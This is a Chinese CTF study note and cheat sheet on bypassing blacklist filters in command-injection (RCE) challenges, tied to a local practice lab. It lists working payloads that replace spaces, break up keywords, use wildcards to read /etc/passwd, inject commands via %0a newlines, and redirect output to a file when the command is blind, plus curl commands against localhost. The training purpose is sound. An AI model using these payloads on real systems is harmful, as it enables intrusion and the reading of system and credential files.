# Web笔记14｜RCE 过滤绕过速查（空格 / 分隔符 / 关键字 / 无回显）

> 适用：命令注入 / RCE 题里后端对输入做了「黑名单过滤」时。
> 配套靶机：`lab_rce_bypass.py`（5 关，本地 Git Bash 跑，每关只拦一种，隔离练）。
> 本笔记所有套路均已在 Git Bash / 沙箱 bash 实测出 flag。

---

## 〇、一句话心法（最重要）

**WAF 拦的是「字符串」，shell 认的是「语义」。**

后端一般长这样（PHP 举例）：

```php
$cmd = $_GET['cmd'];
if (preg_match("/cat|;| /", $cmd)) die("拦了");
system($cmd);          // 或 eval / 反引号 / passthru
```

它只认**字符长得像不像**黑名单。`cat` 这串字母被拦了，但 `c""at` 在 shell 眼里**还是 cat**——
因为 shell 会先「展开/拼接」再执行。所以我们的活儿就是：**把被拦的字符串变形，
让它的「语义」不变、但「长相」避开正则**。

> 比喻：WAF 是门口保安，只看你工牌上写的字。你把「CAT」改成「C A T」「C""AT」
> 保安看不懂，但公司系统（shell）一拼还是同一个人，放你进去了。

---

## 一、空格绕过（靶机 /lv1，只拦空格 0x20）

**为什么能绕**：命令里的空格只是「参数分隔符」，shell 还有别的字符能当分隔符——
`<`（重定向）、`${IFS}`（内部字段分隔符=空格）、Tab、换行、花括号。

| 套路 | 写法 | 原理 |
|---|---|---|
| 重定向代替空格 | `cat<secret.txt` | `<` 既是重定向也是分隔，`cat<文件` 等于 `cat 文件` |
| IFS 变量 | `cat${IFS}secret.txt` | `${IFS}` 展开成空格 |
| `$IFS$9` | `cat$IFS$9secret.txt` | `$9` 是空位置参数，凑一个「非空格字符」防被吃掉 |
| Tab（%09） | `cat%09secret.txt` | Tab 也是空白符，正则常只拦空格漏了 Tab |
| 花括号 | `{cat,secret.txt}` | bash 展开成 `cat secret.txt`，中间无空格 |

**实测通过（出 flag）**：
```
cat<secret.txt
cat${IFS}secret.txt
ca$@t<secret.txt
```

> ⚠️ 注意：`${IFS}` 只能当「分隔符」用（放在词**之间**）。
> 别写成 `c${IFS}at` —— 那样会变成 `c at` 两个词，不是 `cat`（见末尾反例）。

---

## 二、命令 / 关键字绕过（靶机 /lv2，拦 cat/tac/more/nl/head/tail…）

**为什么能绕**：黑名单只拦「连在一起的 cat 这串字母」。只要在字母中间插入
「会被 shell 吃掉/展开成空」的东西，字母就断了，但 shell 拼回来还是 `cat`。

| 套路 | 写法 | 原理 |
|---|---|---|
| 空引号断词 | `c""at secret.txt` | `""` 展开成空，`c""at` = `cat` |
| 单引号断词 | `c''at secret.txt` | 同上，`''` 展开成空 |
| `$@` 断词 | `ca$@t secret.txt` | `$@` 无参数时展开成空 |
| 变量拼接 | `a=c;b=a;c=t;$a$b$c secret.txt` | 用变量拼出 cat（麻烦但稳） |
| 换读文件的命令 | `more`/`nl`/`tac`/`grep .`/`sort`/`strings` | 不叫 cat 就不用绕（但常被一起拦） |
| 文件名通配 | `cat /f*`、`cat s*` | `*` 匹配，避开写死 `flag`/`secret` |

**实测通过（出 flag）**：
```
c""at secret.txt
c''at secret.txt
ca$@t secret.txt
```

> 💡 实战里常是「cat 和 flag 一起拦」。文件名用通配 `fl*` / `se*` 绕过，
> 命令用 `c""at` 绕过，两路同时走。

---

## 二点五、通配符绕过「路径黑名单」（拦 /etc/passwd 时）★

**场景**：后端过滤了 `/etc/passwd`（字符串黑名单），直接 `cat /etc/passwd` 被拦。

**为什么能绕**：过滤器检查的是**用户输入的字符串**，而 `*` 的展开发生在 **shell 内部**
（PHP 的 system 调 /bin/sh 时才展开）。你输入的 `nl /etc/*` 里没有 `/etc/passwd` 字样，
放行后 shell 才把它展开成 `/etc/passwd /etc/group ...` 喂给 nl。

```bash
nl /etc/*        # 展开后包含 /etc/passwd，输入里却没有这几个字（会连别的文件一起读）
nl /etc/pass*    # 更精准：只匹配 passwd 开头的文件
nl /etc/pa??wd   # ? 匹配单个字符，同样不含完整路径
cat /etc/pas*    # 换 cat 同理
```

**实测通过**：模拟 PHP 黑名单（输入含 `/etc/passwd` 就 die），
`nl /etc/passwd` → 被拦 ❌；`nl /etc/*` → 放行并成功读到内容 ✅

> ⚠️ 前提：过滤的是「路径字符串」。如果它连 `etc` 或 `/etc` 都拦，这招失效，
> 得配合变量拼接（`e""tc`）或别的手段。
> ⚠️ `/*` 只匹配一层：`nl /*` 读不到 `/etc/passwd`（第二层），要在那层写通配符。

---

## 三、命令分隔符绕过（靶机 /lv3，拦 ; & | || &&）

**为什么能绕**：注入的精髓是「在原本一条命令后面，塞进第二条命令」。
`; & | && ||` 是显式分隔符，黑名单最爱拦。但**换行符 `\n`（URL 编码 `%0a`）**
常常被漏掉——它也是合法的分隔符。

| 原始 | 绕过 | 说明 |
|---|---|---|
| `ip;cat f` | `ip%0acat f` | `%0a` = 换行，bash 当两条命令 |
| `ip&cat f` | `ip%0acat f` | 同上 |
| `ip|cat f` | `ip%0acat f` | 同上 |

**实测通过（出 flag）**：
```
127.0.0.1%0acat secret.txt
```
（解码后就是 `127.0.0.1\ncat secret.txt`，bash 分两行执行）

> 💡 还有 `%0d`（回车）也常漏。题目若把 `%0a` 也拦了，看它拦的是「字符」还是
> 「解码后」——有时双重编码 `%250a` 能绕（先解码一次变 `%0a`，再解码变换行）。

---

## 四、无回显绕过（靶机 /lv4，命令执行了但看不到输出）

**为什么能绕**：命令跑成功了，只是 stdout 被吞。那就把结果**写到网站能访问的文件里**，
再去读那个文件。

```
# 1) 把 flag 重定向到网站目录下的文件
cat secret.txt > out.txt
# 2) 直接访问 /read?f=out.txt （靶机提供的读取口）拿回内容
```

拓展：真实题里常配合前面的绕过一起用，比如空格被拦就 `cat<secret.txt>out.txt`；
再配合文件包含 / 任意读把 `out.txt` 读出来。

---

## 五、两个翻车反例（实测验证，别踩）

| 写法 | 结果 | 为什么错 |
|---|---|---|
| `c\at secret.txt` | 时灵时不灵 | `\a` 在部分 shell 被当成「响铃符(BEL)」，变成 `c<响铃>t`，不是 cat。靠不住，**别首选** |
| `c${IFS}at secret.txt` | ❌ `c: command not found` | `${IFS}` 展开成空格，整串变成 `c at` 两个词，命令变成 `c`、参数是 `at` |

> 结论：断词用 `c""at` / `c''at` / `ca$@t`（最稳）；空格用 `<` / `${IFS}`（放词之间）。

---

## 六、组合题思路（三问法）

遇到「又拦空格、又拦 cat、还拦分隔符」的叠加题，别慌，拆层：

1. **目标文件是什么？** → 先确定要读 `/flag` 还是 `secret.txt`
2. **被什么堵住了？** → 列清单：空格？关键字？分隔符？回显？逐个对应上面的套路
3. **有没有侧门？** → 换读文件的命令 / 通配符 / 重定向落盘 / 配合 LFI 读

每层都是旧知识 + 一个模板，套进去就行。

---

## 七、本地靶机用法

```bash
# 1) 进目录（必须在 Git Bash 里，因为后端用 bash -c 执行）
cd my_learning/web

# 2) 启动靶机（另开一个 Git Bash 标签页跑，这个别关）
python lab_rce_bypass.py
#    看到 [+] 已生成 secret.txt 和 [*] 已启动 就成功了

# 3) 在另一个 Git Bash 标签页用 curl 打（复杂 payload 写 .py 脚本发，别手敲引号）
curl.exe "http://127.0.0.1:8080/lv0?cmd=127.0.0.1;cat%20secret.txt"
curl.exe "http://127.0.0.1:8080/lv1?cmd=cat%3Csecret.txt"
curl.exe "http://127.0.0.1:8080/lv2?cmd=c%22%22at%20secret.txt"
curl.exe "http://127.0.0.1:8080/lv3?cmd=127.0.0.1%0Acat%20secret.txt"
# lv4 无回显：
curl.exe "http://127.0.0.1:8080/lv4?cmd=cat%20secret.txt%20%3Eout.txt"
curl.exe "http://127.0.0.1:8080/read?f=out.txt"

# 4) 不想要了：在跑靶机的那个标签页按 Ctrl+C 停
```

> 浏览器也能看：直接开 `http://127.0.0.1:8080/` 有目录，`/read?f=xxx` 看文件。

---

## 八、速查卡（贴墙用）

```
空格被拦  →  cat<f    cat${IFS}f    ca$@t<f
cat被拦   →  c""at f  c''at f  ca$@t f   (或用 more/nl/grep，或文件名用 *)
分隔符被拦 →  %0a 换行   (ip%0acat f)
路径被拦  →  nl /etc/*   nl /etc/pass*   (通配符在 shell 内才展开, 输入串不含被拦字样)
无回显    →  > out.txt 再读取
翻车别用  →  c\at(响铃)  c${IFS}at(变两词)
```
